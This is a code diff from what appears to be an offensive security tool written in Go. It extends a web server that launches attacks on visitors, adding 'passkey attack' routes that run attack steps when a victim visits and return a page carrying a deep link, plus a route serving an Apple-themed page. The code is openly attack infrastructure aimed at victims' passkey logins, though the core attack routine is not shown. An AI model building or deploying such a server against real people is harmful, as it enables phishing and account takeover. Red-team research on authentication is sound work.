@@ -12,7 +12,7 @@ import (
 // Results of attacks storage (cleaned after displaying it to the victim)
 var attackResults map[string]attacks.AttackResult = map[string]attacks.AttackResult{}
 
-func LaunchAttacks(atcks []attacks.Attack, qrAttacks []attacks.QrProxyAttack) {
+func LaunchAttacks(atcks []attacks.Attack, qrAttacks []attacks.QrProxyAttack, passkeyAttacks []attacks.PasskeyAttack) {
 	if attacks.Attach {
 		attacks.StartAttachedSession()
 	}
@@ -125,6 +125,35 @@ func LaunchAttacks(atcks []attacks.Attack, qrAttacks []attacks.QrProxyAttack) {
 		})
 	}
 
+	// Handle passkeys attacks
+	prefix = "/passkey"
+	var passkeyUrls []string
+	for _, a := range passkeyAttacks {
+		attack := a
+		url := prefix + attack.Path
+		log.Println(url)
+		passkeyUrls = append(passkeyUrls, url)
+
+		// Upon visit run attack steps
+		http.HandleFunc(url, func(w http.ResponseWriter, r *http.Request) {
+			log.Printf("%s - %s", r.RemoteAddr, attack.Path)
+			comm := make(chan string, 1)
+
+			go attacks.PasskeyVisit(&attack, comm) // Run attack steps
+
+			result := <-comm
+			attackTmpl.Execute(w, struct {
+				TagretLink string
+				DeepLink   string
+				AwayTime   int
+			}{
+				TagretLink: attack.Url,
+				DeepLink:   result,
+				AwayTime:   5000,
+			})
+		})
+	}
+
 	// Index page simply lists the attacks selected
 	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
 		// If an attack was carried out with a result, show it
@@ -138,14 +167,25 @@ func LaunchAttacks(atcks []attacks.Attack, qrAttacks []attacks.QrProxyAttack) {
 		}
 
 		indexTmpl.Execute(w, struct {
-			Attacks   []string
-			QrAttacks []string
-			Result    string
+			Attacks        []string
+			QrAttacks      []string
+			PasskeyAttacks []string
+			Result         string
 		}{
-			Attacks:   urls,
-			QrAttacks: qrUrls,
-			Result:    result,
+			Attacks:        urls,
+			QrAttacks:      qrUrls,
+			PasskeyAttacks: passkeyUrls,
+			Result:         result,
 		})
+	})
+
+	http.HandleFunc("/apple", func(w http.ResponseWriter, r *http.Request) {
+		appleTmpl, err := template.ParseFiles("templates/apple.html")
+		if err != nil {
+			log.Fatal("Could not load apple template page", err)
+			return
+		}
+		appleTmpl.Execute(w, []interface{}{})
 	})
 
 	err = http.ListenAndServe("0.0.0.0:8000", nil)
